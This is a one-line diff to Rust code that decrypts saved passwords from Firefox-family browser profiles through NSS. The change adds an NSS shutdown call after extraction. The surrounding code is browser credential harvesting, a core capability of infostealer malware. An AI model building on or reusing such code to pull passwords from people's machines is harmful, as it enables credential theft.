@@ -464,6 +464,7 @@ pub fn extract_gecko_data() -> Vec<BrowserResult> {
                     if extractor.init_nss(&profile_path) {
                         passwords = extractor.extract_passwords_from_logins(&profile_path);
                         println!("[BrowserData] Found {} passwords from {} profile", passwords.len(), name);
+                        extractor.shutdown_nss();
                     } else {
                         println!("[BrowserData] Failed to initialize NSS for {} profile", name);
                     }
